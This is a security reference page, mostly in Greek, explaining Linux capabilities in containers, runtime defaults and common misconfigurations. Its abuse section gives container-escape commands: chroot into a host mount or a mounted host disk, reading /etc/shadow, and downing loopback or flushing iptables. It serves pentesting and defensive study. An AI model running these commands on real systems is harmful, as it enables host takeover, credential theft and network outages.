# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Οι Linux capabilities είναι ένα από τα πιο σημαντικά στοιχεία της ασφάλειας των containers επειδή απαντούν σε ένα λεπτό αλλά θεμελιώδες ερώτημα: **τι σημαίνει πραγματικά "root" μέσα σε ένα container;** Σε ένα κανονικό σύστημα Linux, το UID 0 ιστορικά υπέθετε ένα πολύ ευρύ σύνολο προνομίων. Σε σύγχρονους πυρήνες, αυτό το προνόμιο διασπάται σε μικρότερες μονάδες που ονομάζονται capabilities. Μια διεργασία μπορεί να τρέχει ως root και παρ' όλα αυτά να στερείται πολλών ισχυρών λειτουργιών αν οι αντίστοιχες capabilities έχουν αφαιρεθεί.

Τα containers βασίζονται πολύ σε αυτή τη διάκριση. Πολλά workloads εξακολουθούν να ξεκινούν ως UID 0 μέσα στο container για λόγους συμβατότητας ή απλότητας. Χωρίς την αποβολή capabilities, αυτό θα ήταν υπερβολικά επικίνδυνο. Με την αποβολή capabilities, μια διεργασία root μέσα σε container μπορεί να εκτελεί πολλές συνηθισμένες ενέργειες εντός του container ενώ της αρνούνται πιο ευαίσθητες λειτουργίες του πυρήνα. Γι' αυτό ένα shell σε container που δείχνει `uid=0(root)` δεν σημαίνει αυτόματα "host root" ή ακόμη και "ευρύ προνόμιο πυρήνα". Τα σύνολα capabilities αποφασίζουν πόσο αξίζει πραγματικά αυτή η ταυτότητα root.

Για την πλήρη αναφορά των Linux capabilities και πολλά παραδείγματα κατάχρησης, δείτε:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Λειτουργία

Οι capabilities παρακολουθούνται σε διάφορα σύνολα, συμπεριλαμβανομένων των permitted, effective, inheritable, ambient, και bounding sets. Για πολλές αξιολογήσεις container, η ακριβής σημασιολογία κάθε συνόλου στον πυρήνα είναι λιγότερο άμεσα σημαντική από το τελικό πρακτικό ερώτημα: **ποιες προνομιούχες ενέργειες μπορεί αυτή η διεργασία να εκτελέσει αυτή τη στιγμή επιτυχώς, και ποιες μελλοντικές αποκτήσεις προνομίων είναι ακόμη δυνατές;**

Ο λόγος που αυτό έχει σημασία είναι ότι πολλές τεχνικές breakout είναι ουσιαστικά προβλήματα capabilities ντυμένα ως προβλήματα container. Ένα workload με `CAP_SYS_ADMIN` μπορεί να έχει πρόσβαση σε τεράστιο μέρος της λειτουργικότητας του πυρήνα που μια κανονική διεργασία root σε container δεν πρέπει να αγγίξει. Ένα workload με `CAP_NET_ADMIN` γίνεται πολύ πιο επικίνδυνο αν επίσης μοιράζεται το host network namespace. Ένα workload με `CAP_SYS_PTRACE` γίνεται πολύ πιο ενδιαφέρον αν μπορεί να δει διεργασίες του host μέσω sharing του host PID. Σε Docker ή Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`; σε Kubernetes συνήθως εμφανίζεται ως `hostPID: true`.

Με άλλα λόγια, το σύνολο capabilities δεν μπορεί να αξιολογηθεί απομονωμένα. Πρέπει να διαβαστεί σε συνδυασμό με namespaces, seccomp, και MAC policy.

## Εργαστήριο

Ένας πολύ άμεσος τρόπος για να επιθεωρήσετε capabilities μέσα σε ένα container είναι:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Μπορείτε επίσης να συγκρίνετε ένα πιο περιοριστικό container με ένα στο οποίο έχουν προστεθεί όλες οι capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Για να δείτε το αποτέλεσμα μιας στενής προσθήκης, δοκιμάστε να αφαιρέσετε τα πάντα και να προσθέσετε ξανά μόνο μία capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Αυτά τα μικρά πειράματα δείχνουν ότι ένα runtime δεν απλώς εναλλάσσει ένα boolean που ονομάζεται «privileged». Διαμορφώνει την πραγματική επιφάνεια προνομίων που είναι διαθέσιμη στη διαδικασία.

## Δυνατότητες Υψηλού Κινδύνου

Παρόλο που πολλές δυνατότητες μπορούν να έχουν σημασία ανάλογα με τον στόχο, λίγες είναι αυτές που επανειλημμένα σχετίζονται με την ανάλυση container escape.

**`CAP_SYS_ADMIN`** είναι αυτή που οι αμυνόμενοι θα πρέπει να αντιμετωπίζουν με τη μεγαλύτερη υποψία. Συχνά περιγράφεται ως «το νέο root» επειδή ξεκλειδώνει τεράστια λειτουργικότητα, συμπεριλαμβανομένων λειτουργιών σχετικών με mount, συμπεριφοράς που εξαρτάται από namespaces και πολλών μονοπατιών του kernel που δεν θα έπρεπε να εκτίθενται ανεπιφύλακτα σε containers. Αν ένα container έχει `CAP_SYS_ADMIN`, αδύναμο seccomp, και χωρίς ισχυρή MAC confinement, πολλά κλασικά μονοπάτια breakout γίνονται πολύ πιο ρεαλιστικά.

**`CAP_SYS_PTRACE`** έχει σημασία όταν υπάρχει ορατότητα διεργασιών, ειδικά αν το PID namespace μοιράζεται με το host ή με ενδιαφέροντες γειτονικούς φορτίους εργασίας. Μπορεί να μετατρέψει την ορατότητα σε tampering.

**`CAP_NET_ADMIN`** και **`CAP_NET_RAW`** έχουν σημασία σε περιβάλλοντα εστιασμένα στο δίκτυο. Σε ένα απομονωμένο bridge network μπορεί ήδη να είναι επικίνδυνες· σε ένα κοινό host network namespace είναι πολύ χειρότερες επειδή το workload μπορεί να είναι σε θέση να αναδιαμορφώσει το host networking, να sniff, να spoof, ή να επηρεάσει τις τοπικές ροές κίνησης.

**`CAP_SYS_MODULE`** είναι συνήθως καταστροφική σε ένα rootful περιβάλλον επειδή το φόρτωμα kernel modules είναι ουσιαστικά έλεγχος του host-kernel. Σχεδόν ποτέ δεν θα έπρεπε να εμφανίζεται σε ένα γενικού σκοπού container workload.

## Runtime Usage

Docker, Podman, containerd-based stacks, και CRI-O χρησιμοποιούν έλεγχο δυνατοτήτων, αλλά τα defaults και οι διεπαφές διαχείρισης διαφέρουν. Το Docker τα εκθέτει πολύ άμεσα μέσω flags όπως `--cap-drop` και `--cap-add`. Το Podman παρέχει παρόμοιους ελέγχους και συχνά επωφελείται από rootless execution ως επιπλέον στρώμα ασφάλειας. Το Kubernetes εμφανίζει προσθήκες και απορρίψεις δυνατοτήτων μέσω του Pod ή container `securityContext`. Περιβάλλοντα system-container όπως LXC/Incus επίσης στηρίζονται στον έλεγχο δυνατοτήτων, αλλά η ευρύτερη ενσωμάτωση στο host αυτών των συστημάτων συχνά ωθεί τους χειριστές να χαλαρώνουν defaults πιο επιθετικά απ’ ό,τι θα έκαναν σε ένα app-container περιβάλλον.

Η ίδια αρχή ισχύει σε όλα αυτά: μια δυνατότητα που τεχνικά είναι δυνατό να δοθεί δεν είναι απαραίτητα μία που θα πρέπει να δοθεί. Πολλά πραγματικά περιστατικά ξεκινούν όταν ένας χειριστής προσθέτει μια δυνατότητα απλά επειδή ένα workload απέτυχε υπό πιο αυστηρή διαμόρφωση και η ομάδα χρειαζόταν μια γρήγορη λύση.

## Misconfigurations

Το πιο προφανές λάθος είναι **`--cap-add=ALL`** σε Docker/Podman-style CLIs, αλλά δεν είναι το μόνο. Στην πράξη, ένα πιο κοινό πρόβλημα είναι η χορήγηση μίας ή δύο εξαιρετικά ισχυρών δυνατοτήτων, ειδικά της `CAP_SYS_ADMIN`, για να «λειτουργήσει η εφαρμογή» χωρίς να κατανοούνται επίσης οι επιπτώσεις σε namespaces, seccomp και mounts. Ένας άλλος συνηθισμένος τρόπος αποτυχίας είναι ο συνδυασμός επιπλέον δυνατοτήτων με το μοίρασμα host namespaces. Σε Docker ή Podman αυτό μπορεί να εμφανιστεί ως `--pid=host`, `--network=host`, ή `--userns=host`; στο Kubernetes η αντίστοιχη έκθεση συνήθως εμφανίζεται μέσω ρυθμίσεων workload όπως `hostPID: true` ή `hostNetwork: true`. Κάθε ένας από αυτούς τους συνδυασμούς αλλάζει το τι μπορεί πραγματικά να επηρεάσει η δυνατότητα.

Είναι επίσης κοινό να βλέπεις διαχειριστές να πιστεύουν ότι επειδή ένα workload δεν είναι πλήρως `--privileged`, παραμένει ουσιαστικά περιορισμένο. Κάποιες φορές αυτό ισχύει, αλλά κάποιες φορές η πραγματική θέση είναι ήδη τόσο κοντά στο privileged που η διάκριση παύει να έχει σημασία σε λειτουργικό επίπεδο.

## Κατάχρηση

Το πρώτο πρακτικό βήμα είναι να απαριθμήσετε το σύνολο των ενεργών δυνατοτήτων και να δοκιμάσετε άμεσα τις ενέργειες συγκεκριμένες για κάθε δυνατότητα που θα είχαν σημασία για escape ή πρόσβαση σε πληροφορίες του host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Αν το `CAP_SYS_ADMIN` είναι παρόν, δοκιμάστε πρώτα mount-based abuse και host filesystem access, καθώς πρόκειται για έναν από τους πιο συνηθισμένους breakout enablers:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Αν το `CAP_SYS_PTRACE` υπάρχει και το container μπορεί να δει ενδιαφέροντα processes, επαληθεύστε εάν η capability μπορεί να μετατραπεί σε process inspection:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Εάν το `CAP_NET_ADMIN` ή το `CAP_NET_RAW` είναι παρόν, δοκιμάστε κατά πόσον το workload μπορεί να χειριστεί την ορατή στοίβα δικτύου ή τουλάχιστον να συλλέξει χρήσιμες πληροφορίες δικτύου:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Όταν ένα capability test πετύχει, συνδυάστε το με την κατάσταση του namespace. Μια capability που φαίνεται απλώς ριψοκίνδυνη σε ένα απομονωμένο namespace μπορεί να μετατραπεί αμέσως σε escape ή host-recon primitive όταν το container μοιράζεται επίσης host PID, host network ή host mounts.

### Πλήρες Παράδειγμα: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Αν το container έχει `CAP_SYS_ADMIN` και ένα εγγράψιμο bind mount του host filesystem όπως το `/host`, η διαδρομή για escape είναι συχνά απλή:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Εάν `chroot` επιτύχει, οι εντολές πλέον εκτελούνται στο πλαίσιο του root filesystem του host:
```bash
id
hostname
cat /etc/shadow | head
```
Αν το `chroot` δεν είναι διαθέσιμο, το ίδιο αποτέλεσμα μπορεί συχνά να επιτευχθεί καλώντας το binary μέσω του mounted tree:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Πλήρες Παράδειγμα: `CAP_SYS_ADMIN` + Πρόσβαση σε Συσκευή

Αν μια block device του host είναι εκτεθειμένη, το `CAP_SYS_ADMIN` μπορεί να την μετατρέψει σε άμεση πρόσβαση στο filesystem του host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Πλήρες παράδειγμα: `CAP_NET_ADMIN` + Host Networking

Αυτός ο συνδυασμός δεν παράγει πάντα απευθείας host root, αλλά μπορεί να αναδιαμορφώσει πλήρως το host network stack:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Αυτό μπορεί να επιτρέψει denial of service, traffic interception ή πρόσβαση σε υπηρεσίες που προηγουμένως φιλτράρονταν.

## Checks

Ο στόχος των capability checks δεν είναι μόνο να dump raw values, αλλά να κατανοήσουμε αν η διεργασία έχει αρκετό privilege ώστε η τρέχουσα κατάσταση namespace και mount να γίνει επικίνδυνη.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
What is interesting here:

- `capsh --print` είναι ο πιο εύκολος τρόπος για να εντοπίσετε υψηλού ρίσκου capabilities όπως `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ή `cap_sys_module`.
- Η γραμμή `CapEff` στο `/proc/self/status` σας λέει τι είναι πραγματικά ενεργό τώρα, όχι μόνο τι μπορεί να είναι διαθέσιμο σε άλλα σύνολα.
- Ένα capability dump γίνεται πολύ πιο σημαντικό αν το container επίσης μοιράζεται host PID, network, ή user namespaces, ή έχει εγγράψιμα host mounts.

After collecting the raw capability information, the next step is interpretation. Ask whether the process is root, whether user namespaces are active, whether host namespaces are shared, whether seccomp is enforcing, and whether AppArmor or SELinux still restricts the process. A capability set by itself is only part of the story, but it is often the part that explains why one container breakout works and another fails with the same apparent starting point.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Μειωμένο σύνολο capabilities από προεπιλογή | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Μειωμένο σύνολο capabilities από προεπιλογή | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Συνήθως runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Για το Kubernetes, το σημαντικό σημείο είναι ότι το API δεν ορίζει ένα ενιαίο καθολικό default capability set. Αν το Pod δεν προσθέτει ή δεν αφαιρεί capabilities, το workload κληρονομεί το runtime default για αυτόν τον node.
